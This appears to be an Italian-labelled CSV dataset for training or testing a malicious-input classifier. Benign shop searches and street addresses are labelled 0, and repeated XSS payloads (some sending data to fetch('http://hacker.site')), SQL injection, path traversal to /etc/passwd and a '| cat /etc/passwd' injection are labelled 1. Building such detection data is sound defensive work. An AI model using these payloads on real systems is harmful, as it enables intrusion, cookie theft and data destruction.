testo,etichetta
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
cerco zaino rosso taglia 44,0
'; DROP TABLE admin; --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
../../../etc/passwd,1
"<svg onload=""fetch('http://hacker.site')"">",1
..%2f%2f%2f%2fvar/www/html/config.php,1
<script>alert(document.cookie)</script>,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
'; DROP TABLE admin; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Roma 39, Roma",0
compra orologio online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../../etc/passwd,1
"Via Dante 148, Torino",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert('pwned')</script>,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
..%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE utenti; --,1
compra pantaloni online in offerta,0
../../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
cerco felpa nero taglia 42,0
<script>alert('pwned')</script>,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert('pwned')</script>,1
<body onload=alert('hacked')>,1
compra felpa online in offerta,0
cerco zaino giallo taglia L,0
<script>alert('pwned')</script>,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../../windows/win.ini,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE carte_credito; --,1
"Corso Italia 212, Roma",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE utenti; --,1
..%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../../../../../../etc/passwd,1
<script>alert('pwned')</script>,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE admin; --,1
<script>fetch('http://hacker.site')</script>,1
../../../../../../../etc/passwd,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
"Via Garibaldi 199, Milano",0
<script>alert('pwned')</script>,1
'; DROP TABLE carte_credito; --,1
<script>alert(document.cookie)</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert(document.cookie)</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1; UPDATE users SET role='admin' WHERE id=1;,1
compra pantaloni online in offerta,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
'; DROP TABLE admin; --,1
<script>fetch('http://hacker.site')</script>,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
../../../etc/passwd,1
<script>alert(document.cookie)</script>,1
compra zaino online in offerta,0
<script>fetch('http://hacker.site')</script>,1
'; DROP TABLE carte_credito; --,1
"<svg onload=""alert(document.cookie)"">",1
"Via Garibaldi 16, Firenze",0
compra orologio online in offerta,0
compra maglietta online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
cerco scarpe grigio taglia L,0
compra scarpe online in offerta,0
"<svg onload=""alert('pwned')"">",1
<script>fetch('http://hacker.site')</script>,1
"<svg onload=""alert(document.cookie)"">",1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE carte_credito; --,1
<script>alert(document.cookie)</script>,1
../../../etc/passwd,1
cerco felpa blu taglia M,0
"Via Mazzini 115, Firenze",0
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE utenti; --,1
<script>alert('pwned')</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
cerco giacca nero taglia 43,0
<script>alert(document.cookie)</script>,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert(document.cookie)"">",1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE admin; --,1
compra zaino online in offerta,0
"<svg onload=""fetch('http://hacker.site')"">",1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
"<svg onload=""alert('pwned')"">",1
..%2f%2f%2f%2fvar/www/html/config.php,1
cerco giacca nero taglia 44,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Mazzini 179, Torino",0
compra scarpe online in offerta,0
"Via Mazzini 160, Firenze",0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
<script>fetch('http://hacker.site')</script>,1
cerco scarpe giallo taglia XL,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE clienti; --,1
<script>alert('pwned')</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
cerco zaino rosso taglia S,0
"<svg onload=""fetch('http://hacker.site')"">",1
penna a sfera inchiostro nero,0
../../../../etc/passwd,1
compra zaino online in offerta,0
"<svg onload=""alert(document.cookie)"">",1
"<svg onload=""alert('pwned')"">",1
compra maglietta online in offerta,0
<a href='javascript:alert(1)'>Clicca qui</a>,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
cerco maglietta verde taglia 43,0
../../../../../../../etc/passwd,1
"<svg onload=""alert(document.cookie)"">",1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
cerco felpa bianco taglia 42,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../../../../../etc/passwd,1
'; DROP TABLE config; --,1
"<svg onload=""alert(document.cookie)"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Roma 13, Roma",0
compra scarpe online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
../../../../../../etc/passwd,1
../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
..%2f%2f%2f%2fvar/www/html/config.php,1
guanti da palestra traspiranti,0
cerco pantaloni grigio taglia 44,0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
"Via Milano 238, Genova",0
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
'; DROP TABLE admin; --,1
<script>fetch('http://hacker.site')</script>,1
<script>fetch('http://hacker.site')</script>,1
'; DROP TABLE carte_credito; --,1
../../../../../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE admin; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../../../etc/passwd,1
'; DROP TABLE clienti; --,1
compra felpa online in offerta,0
"Via Mazzini 18, Genova",0
<script>alert(document.cookie)</script>,1
..%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE config; --,1
"<svg onload=""alert(document.cookie)"">",1
compra zaino online in offerta,0
cerco scarpe rosso taglia 42,0
../../../../../../../../etc/passwd,1
../../../../../etc/passwd,1
"<svg onload=""fetch('http://hacker.site')"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert(document.cookie)</script>,1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
'; INSERT INTO system_log (event) VALUES ('hacked'); --,1
<script>alert(document.cookie)</script>,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
cerco maglietta giallo taglia L,0
..%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
cerco scarpe grigio taglia 44,0
scarpe rosse taglia 42,0
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
..%2f%2f%2f%2fvar/www/html/config.php,1
"Via Roma 195, Bologna",0
1' OR 'a'='a' UNION SELECT * FROM admin --,1
"Via Roma 74, Napoli",0
../../../../../../etc/passwd,1
../../../etc/passwd,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
compra giacca online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
cerco pantaloni nero taglia 44,0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../../etc/passwd,1
"<svg onload=""alert(document.cookie)"">",1
"Via Dante 17, Torino",0
"<svg onload=""alert(document.cookie)"">",1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
'; DROP TABLE config; --,1
<script>alert(document.cookie)</script>,1
<script>alert('pwned')</script>,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Mazzini 29, Genova",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
compra scarpe online in offerta,0
"Corso Italia 10, Palermo",0
compra felpa online in offerta,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
cerco pantaloni giallo taglia L,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
"<svg onload=""alert('pwned')"">",1
"Via Roma 128, Roma",0
"Via Dante 14, Napoli",0
cerco pantaloni giallo taglia 41,0
cerco felpa verde taglia 43,0
<script>fetch('http://hacker.site')</script>,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
../../../../etc/hosts,1
"<svg onload=""alert('pwned')"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../../../../../etc/passwd,1
compra giacca online in offerta,0
"<svg onload=""alert(document.cookie)"">",1
cintura in cuoio marrone,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Dante 167, Roma",0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE sessions; --,1
..%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
..%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert(document.cookie)"">",1
../../../etc/passwd,1
compra pantaloni online in offerta,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
cerco pantaloni giallo taglia 43,0
"Via Roma 3, Roma",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Garibaldi 153, Genova",0
"<svg onload=""alert('pwned')"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Milano 139, Palermo",0
compra scarpe online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
"Via Roma 89, Napoli",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
"Via Roma 57, Torino",0
"<svg onload=""alert(document.cookie)"">",1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
"Via Roma 162, Palermo",0
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Mazzini 185, Bologna",0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""alert(document.cookie)"">",1
/etc/passwd,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
../../../../etc/passwd,1
"<svg onload=""alert(document.cookie)"">",1
..%2f%2f%2fvar/www/html/config.php,1
cerco pantaloni nero taglia L,0
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
<script>fetch('http://hacker.site')</script>,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
../../../../../../etc/passwd,1
"Via Garibaldi 172, Genova",0
../../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
"<svg onload=""alert(document.cookie)"">",1
<script>fetch('http://hacker.site')</script>,1
cerco orologio grigio taglia 44,0
'; DROP TABLE config; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert('pwned')</script>,1
../../../../../../etc/passwd,1
cerco pantaloni nero taglia 42,0
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
"Via Garibaldi 13, Torino",0
cerco giacca giallo taglia L,0
'; DROP TABLE clienti; --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
<script>alert(document.cookie)</script>,1
cerco scarpe blu taglia M,0
<script>alert('pwned')</script>,1
"<svg onload=""alert(document.cookie)"">",1
"Via Mazzini 241, Torino",0
'; DROP TABLE config; --,1
../../../../../etc/passwd,1
compra orologio online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert(document.cookie)</script>,1
"<svg onload=""fetch('http://hacker.site')"">",1
../../../../../etc/passwd,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../etc/passwd,1
'; DROP TABLE utenti; --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
<script>alert('pwned')</script>,1
<script>fetch('http://hacker.site')</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
compra zaino online in offerta,0
'; DROP TABLE admin; --,1
"<svg onload=""fetch('http://hacker.site')"">",1
..%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
"Via Roma 79, Milano",0
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert('pwned')"">",1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
"<svg onload=""alert('pwned')"">",1
'; DROP TABLE utenti; --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
cerco maglietta rosso taglia M,0
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
compra felpa online in offerta,0
<script>fetch('http://hacker.site')</script>,1
candela profumata alla vaniglia,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
custodia smartphone trasparente,0
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
'; DROP TABLE config; --,1
../../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert(document.cookie)</script>,1
'; DROP TABLE sessions; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Garibaldi 184, Palermo",0
<script>fetch('http://hacker.site')</script>,1
"Via Mazzini 54, Bologna",0
"<svg onload=""alert(document.cookie)"">",1
1' OR 'a'='a' UNION SELECT * FROM admin --,1
"<svg onload=""fetch('http://hacker.site')"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
felpa con cappuccio grigia,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert(document.cookie)</script>,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
cerco felpa rosso taglia S,0
../../../../../etc/passwd,1
"Via Dante 100, Bologna",0
'; DROP TABLE config; --,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
../../../../../etc/passwd,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
..%2f%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""fetch('http://hacker.site')"">",1
"<svg onload=""fetch('http://hacker.site')"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
"Via Milano 142, Bologna",0
compra felpa online in offerta,0
'; DROP TABLE utenti; --,1
"Corso Italia 69, Roma",0
cerco felpa blu taglia XL,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Dante 25, Firenze",0
compra pantaloni online in offerta,0
<script>alert(document.cookie)</script>,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
cerco felpa verde taglia 41,0
<script>fetch('http://hacker.site')</script>,1
'; DROP TABLE utenti; --,1
"<svg onload=""alert('pwned')"">",1
'; DROP TABLE config; --,1
../../../../../../etc/passwd,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
<script>alert('pwned')</script>,1
| cat /etc/passwd,1
..%2f%2f%2f%2fvar/www/html/config.php,1
../../../../../etc/passwd,1
compra pantaloni online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
"<svg onload=""alert('pwned')"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"1' OR BENCHMARK(10000000,MD5(1)) --",1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
cerco orologio giallo taglia M,0
"Via Roma 61, Palermo",0
"Via Milano 97, Genova",0
compra orologio online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE utenti; --,1
'; DROP TABLE clienti; --,1
<marquee onstart=alert(1)>,1
<script>alert('pwned')</script>,1
<script>fetch('http://hacker.site')</script>,1
<script>alert(document.cookie)</script>,1
"<svg onload=""alert('pwned')"">",1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
cerco pantaloni rosso taglia 43,0
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
"Corso Italia 164, Torino",0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../../../etc/passwd,1
'; DROP TABLE carte_credito; --,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""fetch('http://hacker.site')"">",1
"<svg onload=""alert(document.cookie)"">",1
"<svg onload=""alert(document.cookie)"">",1
../../../etc/passwd,1
../../../../../../../../etc/passwd,1
../../../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
'; DROP TABLE utenti; --,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
tè verde biologico in foglie,0
'; DROP TABLE config; --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"Via Roma 85, Torino",0
..%2f%2f%2fvar/www/html/config.php,1
../../../etc/passwd,1
'; DROP TABLE clienti; --,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
../../../../../../etc/passwd,1
../../../../../etc/passwd,1
../../../../../../../etc/passwd,1
..%2f%2f%2f%2fvar/www/html/config.php,1
'; DROP TABLE admin; --,1
../../../../../../etc/passwd,1
../../../../../etc/passwd,1
<script>fetch('http://hacker.site')</script>,1
../../../../../../../etc/passwd,1
"<svg onload=""fetch('http://hacker.site')"">",1
../../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert('pwned')</script>,1
mario.rossi@email.com,0
compra felpa online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
"<svg onload=""alert(document.cookie)"">",1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
'; DROP TABLE carte_credito; --,1
cerco giacca verde taglia 41,0
1' OR 'a'='a' UNION SELECT * FROM sessions --,1
../../../../../../etc/passwd,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
..%2f%2f%2f%2fvar/www/html/config.php,1
compra pantaloni online in offerta,0
<script>alert(document.cookie)</script>,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
compra giacca online in offerta,0
"<svg onload=""alert(document.cookie)"">",1
cerco pantaloni blu taglia XL,0
../../../../../../../../etc/passwd,1
..%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert(document.cookie)"">",1
"Via Roma 229, Palermo",0
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
../../../../etc/passwd,1
compra orologio online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM admin --,1
compra felpa online in offerta,0
'; DROP TABLE sessions; --,1
<script>alert(document.cookie)</script>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert('pwned')</script>,1
..%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
'; DROP TABLE config; --,1
cerco pantaloni blu taglia S,0
cerco pantaloni blu taglia L,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>alert('pwned')</script>,1
cerco felpa nero taglia XL,0
../../../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
'; DROP TABLE carte_credito; --,1
cerco felpa bianco taglia 41,0
cerco scarpe bianco taglia 41,0
<script>alert('pwned')</script>,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
<script>alert('pwned')</script>,1
compra pantaloni online in offerta,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
<script>alert(document.cookie)</script>,1
..%2f%2f%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
../../../../../etc/passwd,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
compra pantaloni online in offerta,0
"<svg onload=""fetch('http://hacker.site')"">",1
..%2f%2f%2fvar/www/html/config.php,1
..%2f%2f%2f%2f%2f%2fvar/www/html/config.php,1
"<svg onload=""alert(document.cookie)"">",1
<script>alert(document.cookie)</script>,1
cerco orologio bianco taglia 42,0
../../../../../etc/passwd,1
../../../../etc/passwd,1
'; DROP TABLE carte_credito; --,1
"<svg onload=""alert(document.cookie)"">",1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
<script>fetch('http://hacker.site')</script>,1
cerco zaino verde taglia S,0
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
<script>alert(document.cookie)</script>,1
../../../etc/passwd,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2f%2fvar/www/html/config.php,1
cerco felpa verde taglia 43,0
..%2f%2f%2f%2fvar/www/html/config.php,1
compra felpa online in offerta,0
cerco pantaloni grigio taglia L,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
"<svg onload=""alert('pwned')"">",1
<script>fetch('http://hacker.site')</script>,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
'; DROP TABLE clienti; --,1
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
'; DROP TABLE clienti; --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
cerco pantaloni bianco taglia M,0
1 AND (SELECT 500 FROM WHERE 1=1) PRIVILEGES,1
..%2f%2f%2fvar/www/html/config.php,1
<img src='invalid-image.jpg' onerror='fetch('http://hacker.site')'>,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
<script>alert('pwned')</script>,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
'; DROP TABLE carte_credito; --,1
compra scarpe online in offerta,0
1' OR 'a'='a' UNION SELECT * FROM admin --,1
1' OR 'a'='a' UNION SELECT * FROM config --,1
'; DROP TABLE sessions; --,1
compra felpa online in offerta,0
<img src='invalid-image.jpg' onerror='alert('pwned')'>,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
cerco orologio blu taglia M,0
'; DROP TABLE sessions; --,1
../../../../../../../etc/passwd,1
1' OR 'a'='a' UNION SELECT * FROM utenti --,1
1' OR 'a'='a' UNION SELECT * FROM clienti --,1
'; DROP TABLE config; --,1
1' OR 'a'='a' UNION SELECT * FROM carte_credito --,1
<img src='invalid-image.jpg' onerror='alert(document.cookie)'>,1
"Via Mazzini 127, Napoli",0
